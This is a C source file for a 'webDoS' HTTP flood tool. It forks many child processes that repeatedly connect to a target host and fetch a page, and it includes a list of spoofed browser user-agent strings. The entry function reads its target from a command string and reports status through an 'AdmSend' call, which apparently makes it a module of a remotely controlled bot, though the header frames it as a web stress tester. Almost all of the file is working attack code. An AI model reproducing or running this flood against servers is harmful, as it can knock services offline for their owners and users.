/*
Author:    Hu Jiaying
Date:    2002/07/27
Email:    hujiaying@sina.com
Function:  Denial of Service Attack on web service.To get the performance
of your web server.
Usage:    ./DoS <hostname or ip> <port> <page path> 
<#children> <#loops/child>

Example:  ./DoS www.myhost.com 80 /index.html 100 50
100 child process run at the same time,every child fetch 50 times

Comment:  To be honest,this is not a effective denial-of-service attack
tool.I just want to provide a press test tool on web pages to get the
performance of my web service.It connects to the web server and fecth
a web page.
If you want a effective denial-of-service attack tool,please
refer to syn.c.It just send syn packet to web server with different
source ip.

Enjoy! :)
*/
#include <stdio.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>


char *useragents[] = {
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
};


#define MAXLINE 1024
#define MAXN 102400
//16384

int Socket(int family, int type, int protocol);
void Connect(int fd, const struct sockaddr *sa, socklen_t salen);
int Tcp_connect(const char *host,const char *port);
void Write(int fd, void *ptr, size_t nbytes);
ssize_t Readn(int fd, void *ptr, size_t nbytes);
ssize_t readn(int fd, void *vptr, size_t n);
void Close(int fd);
pid_t Fork(void);
u_int32_t domain2ip_n(const char *domain) ;

void webdos(char *s)
{   

	if (mfork() != 0) return;
	time_t my_time;
	time(&my_time);
	struct tm * time_real; 
	time_real = localtime (&my_time);

	struct timespec start, end;
	double start_sec, end_sec, elapsed_sec;
	clock_gettime(CLOCK_REALTIME, &start);
	int i,j,sd,nchildren,nloops,nbytes;
	pid_t pid;
	ssize_t n;
	char request[MAXLINE],reply[MAXN];
	char PagePath[1024];
	char i1[128]= "", i2[128]= "", i3[128]= "", i4[128]= "", i5[128]= "";
	char *text = s;
	sscanf(text, "%s %s %s %s %s", &i1, &i2, &i3, &i4, &i5);
	//Send("%s %s %s %s %s",i1, i2, i3, i4, i5);
	//  if(argc!=6)
	//{
	//printf("usage:%s <hostname or ip> <port> <page path> <children> <loops/child>\n",argv[0]);
	//exit(0);
	//}
	memset(PagePath,0,sizeof(PagePath));
	memset(request,0,sizeof(request));
	strcpy(PagePath,i3);
	nchildren=atoi(i4);
	nloops=atoi(i5);
	nbytes=1024*1024;
	AdmSend("%s\nwebDoS Starting > %s ...\n",asctime(time_real),i1);
	snprintf(request,sizeof(request),"GET %s HTTP/1.0\r\n\r\n",PagePath);
	//  printf("request=[%s]\n",request);
	for(i=0;i<nchildren;i++)
	{
		if((pid=Fork())==0)
		{
			for(j=0;j<nloops;j++)
			{
				sd=Tcp_connect(i1,i2);
				Write(sd,request,strlen(request));
				if((n=Readn(sd,reply,nbytes))!=nbytes)
					//   Send("server returned %d bytes\n",n);
					Close(sd);
			}
			// Send("child %d done\n",i);
			exit(0);
		}
	}
	while(n=wait(NULL)>0);
	while (--pid) wait(NULL);
	waitpid(-1, 0, WNOHANG);
	//kill((pid_t) getppid(), SIGTERM);
	/* finally return 0,no child was available,errno is set to an appropriate value */
	time(&my_time);
	time_real = localtime(&my_time);	
	AdmSend("%s\n[webDoS DONE]\n",asctime(time_real));
	clock_gettime(CLOCK_REALTIME, &end);
	start_sec = start.tv_sec + start.tv_nsec/NANO_PER_SEC;
	end_sec = end.tv_sec + end.tv_nsec/NANO_PER_SEC;
	elapsed_sec = end_sec - start_sec;
	AdmSend("The operation took %.3f seconds\n", elapsed_sec);
	exit(0);
	if(errno!=ECHILD)  /* no child was available */
	{
		//  printf("wait error");
		exit(1);
	}


	exit(0);
}
int Tcp_connect(const char *host,const char *port)
{
	int sd,port_h;
	u_int32_t ip;
	struct sockaddr_in srvaddr;
	struct servent  *sv;

	sd=Socket(AF_INET,SOCK_STREAM,0);
	bzero(&srvaddr,sizeof(srvaddr));
	srvaddr.sin_family=AF_INET;
	srvaddr.sin_port=htons(atoi(port));
	ip=domain2ip_n(host);
	memcpy(&srvaddr.sin_addr.s_addr,&ip,4);

	Connect(sd,(struct sockaddr *)&srvaddr,sizeof(srvaddr));
	return sd;
}

	void
Write(int fd, void *ptr, size_t nbytes)
{
	if (write(fd, ptr, nbytes) != nbytes)
	{
		//printf("write error");
		exit(1);
	}
}

	ssize_t
Readn(int fd, void *ptr, size_t nbytes)
{
	ssize_t         n;
	if ( (n = readn(fd, ptr, nbytes)) < 0)
	{
		//printf("readn error");
		exit(1);
	}
	return(n);
}

	ssize_t                                         /* Read "n" bytes from a descriptor. */
readn(int fd, void *vptr, size_t n)
{
	size_t  nleft;
	ssize_t nread;
	char    *ptr;

	ptr = vptr;
	nleft = n;
	while (nleft > 0) {
		if ( (nread = read(fd, ptr, nleft)) < 0) {
			if (errno == EINTR)
				nread = 0;              /* and call read() again */
			else
				return(-1);
		} else if (nread == 0)
			break;                          /* EOF */
		nleft -= nread;
		ptr   += nread;
	}
	return(n - nleft);              /* return >= 0 */
}
/* end readn */

void Close(int fd)
{
	if (close(fd) == -1)
	{
		//printf("close error");
		exit(1);
	}
}

pid_t Fork(void)
{
	pid_t   pid;

	if ( (pid = fork()) == -1)
	{
		//printf("fork error");
		exit(1);
	}
	return(pid);
}

u_int32_t domain2ip_n(const char *domain)       //return network order(binary)
{
	static u_int32_t ip_n;
	struct hostent *ht;

	if((ht=gethostbyname(domain))==NULL)
	{
		//printf("gethostbyname() error for host:%s:%s",domain,
		//		hstrerror(h_errno));
		exit(1);
	}
	memcpy(&ip_n,ht->h_addr,4);
	return ip_n;
}

int Socket(int family, int type, int protocol)
{
	int             n;

	if ( (n = socket(family, type, protocol)) < 0)
	{
		//printf("socket error");
		exit(1);
	}
	return(n);
}

void Connect(int fd, const struct sockaddr *sa, socklen_t salen)
{
	if (connect(fd, sa, salen) < 0)
	{
		//	printf("connect error");
		exit(1);
	}
}
